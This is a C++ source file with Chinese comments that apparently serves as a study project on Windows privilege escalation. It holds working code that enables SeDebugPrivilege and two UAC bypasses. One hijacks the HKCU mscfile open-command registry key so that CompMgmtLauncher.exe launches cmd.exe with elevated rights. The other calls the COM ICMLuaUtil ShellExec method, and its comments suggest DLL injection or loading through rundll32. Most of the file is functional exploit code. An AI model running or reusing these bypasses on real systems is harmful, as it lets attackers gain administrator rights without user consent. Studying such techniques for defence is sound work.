// PrivilegeEscalating.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include "BypassUAC.h"
/**
 * Windows中执行权限决定了很多操作是否能进行
 * 这就有了各种对于提权的研究
 */

 /**
  * 进程访问令牌权限提升
  */
void ShowError(const char* pszText)
{
	char szErr[MAX_PATH] = { 0 };
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szErr, "ERROR", MB_OK);
}


BOOL EnbalePrivileges(HANDLE hProcess, const char* pszPrivilegesName)
{
	HANDLE hToken = NULL;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges = { 0 };
	BOOL bRet = FALSE;
	DWORD dwRet = 0;


	// 打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄
	bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (FALSE == bRet)
	{
		ShowError("OpenProcessToken");
		return FALSE;
	}
	// 获取本地系统的 pszPrivilegesName 特权的LUID值
	bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &luidValue);
	if (FALSE == bRet)
	{
		ShowError("LookupPrivilegeValue");
		return FALSE;
	}
	// 设置提升权限信息
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	// 提升进程令牌访问权限
	bRet = ::AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL);
	if (FALSE == bRet)
	{
		ShowError("AdjustTokenPrivileges");
		return FALSE;
	}
	else
	{
		// 根据错误码判断是否特权都设置成功
		dwRet = ::GetLastError();
		if (ERROR_SUCCESS == dwRet)
		{
			return TRUE;
		}
		else if (ERROR_NOT_ALL_ASSIGNED == dwRet)
		{
			//管理员打开才能都成功，那提权具体指什么？
			ShowError("ERROR_NOT_ALL_ASSIGNED");
			return FALSE;
		}
	}

	return FALSE;
}

void test_AdjustTokenPrivileges()
{
	if (FALSE == EnbalePrivileges(::GetCurrentProcess(), SE_DEBUG_NAME))
	{
		printf("Enable Privileges Error!\n");
	}

	printf("Enable Privileges OK!\n");
	system("pause");
}

/**
 * ByPass UAC
 * Vista系统之后，管理员运行程序时有一个很常见的弹框，就是UAC机制
 * 触发UAC时，系统创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程
 * 请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数
 * 该函数首先验证路径是否存在于白名单，并将结果传递给consent.exe进程，该进程验证请求进程签名及其发起者权限是否符合要求
 * 最后决定是否弹出UAC窗口给用户确认，这个UAC窗口会创建新的安全桌面，屏蔽之前界面，同时这个窗口时系统权限进程，其他普通进程无法与其交互
 * 用户确认后，调用CreateProcessAsUser函数以管理员身份启动进程
 */

 /**
  * 基于白名单：
  * 分析一些白名单程序的启动流程，例如CompMgmtLauncher.exe
  * 可以发现程序启动时对注册表有一些操作，启动一些程序，如果在过程中插入自己想要启动的程序路径
  * 那么这个程序就能以管理员权限启动了
  */
  // 修改注册表
BOOL SetReg(const char* lpszExePath)
{
	HKEY hKey = NULL;
	// 创建项
	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (NULL == hKey)
	{
		ShowError("RegCreateKeyEx");
		return FALSE;
	}
	// 设置键值
	::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath)));
	// 关闭注册表
	::RegCloseKey(hKey);
	return TRUE;
}
void test_ByPassUAC_WhiteList()
{
	BOOL bRet = FALSE;
	PVOID OldValue = NULL;
	// 关闭文件重定位
	::Wow64DisableWow64FsRedirection(&OldValue);

	// 修改注册表
	bRet = SetReg("C:\\Windows\\System32\\cmd.exe");
	if (bRet)
	{
		// 运行 CompMgmtLauncher.exe
		system("CompMgmtLauncher.exe");
		printf("Run OK!\n");
	}
	else
	{
		printf("Run ERROR!\n");
	}

	// 恢复文件重定位
	::Wow64RevertWow64FsRedirection(OldValue);

	system("pause");
}

/**
 * 基于COM组件接口：
 * COM提升名称技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，提升COM接口权限
 * 其中ICMLuaUtil接口提供了ShellExec方法执行命令，创建指定进程
 * 
 * 这里方便测试直接在该项目中运行，由于项目本身不受信任，所以会触发UAC弹窗
 * 可以通过向可信程序（计算器/记事本/资源管理器）做DLL注入或劫持
 * 最简单的还可以通过rundll32.exe直接加载dll并调用导出函数
 * 需要注意的是，导出函数格式有要求：
	void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
	{
		CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe");
	}
	在Github上搜索UACME，还有很多方法
 */
void test_ByPassUAC_COM()
{
	CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe");
}

int main()
{
	//提升当前进程令牌权限
	//test_AdjustTokenPrivileges();

	//修改白名单程序启动过程中使用的注册表项来提权
	//test_ByPassUAC_WhiteList();

	//基于COM接口提权
	test_ByPassUAC_COM();

	return 0;
}

